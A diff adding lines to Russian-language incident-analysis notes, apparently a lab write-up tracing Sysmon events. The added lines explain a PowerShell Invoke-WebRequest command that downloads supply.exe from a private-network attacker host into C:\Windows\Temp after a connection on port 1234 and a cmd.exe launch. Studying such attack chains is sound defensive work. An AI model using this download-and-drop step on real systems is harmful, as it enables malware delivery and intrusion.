@@ -85,3 +85,9 @@ Event ID = 15.  FileCreateStreamHash (Создание файлового пот
 Соединение с 192.168.1.11:1234 
 ![](attachment/Pasted%20image%2020261115214002.png)Запуск cmd.exe.
 
+![](attachment/Pasted%20image%2020261115220142.png)cmd записал supply.exe на диск.
+- **`-c`** — сокращение от `-Command`. Говорит `powershell.exe` выполнить то, что написано дальше.
+- **`Invoke-WebRequest`** — команда PowerShell, которая отправляет веб-запрос и получает ответ сервера.
+- **`-Uri`** — параметр, задающий адрес запроса. `http://192.168.1.11:6969/supply.exe`
+Сохранение ответа в C:\Windows\Temp\supply.exe.
+
